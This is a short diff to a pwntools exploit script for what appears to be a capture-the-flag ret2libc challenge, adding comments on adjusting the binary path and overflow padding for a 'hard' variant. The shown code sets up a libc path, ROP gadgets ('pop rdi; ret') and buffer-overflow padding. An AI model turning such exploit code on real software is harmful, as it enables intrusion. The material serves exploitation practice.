@@ -1,7 +1,7 @@
 from pwn import *
 
 libc_path = '/lib/x86_64-linux-gnu/libc-2.31.so'
-exe = '/challenge/leveraging-libc-easy'
+exe = '/challenge/leveraging-libc-easy' #add hard in hard challenge
 
 context.binary = exe
 #context.terminal = ["tmux", "splitw", "-h"]
@@ -29,7 +29,7 @@ rop = ROP([elf, libc])
 pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
 ret = rop.find_gadget(['ret'])[0]
 
-padding = b'A' * 64
+padding = b'A' * 64 #replace it with 96 for hard
 padding += b'B' * 8
 
 exit_pos = libc.symbols["exit"]
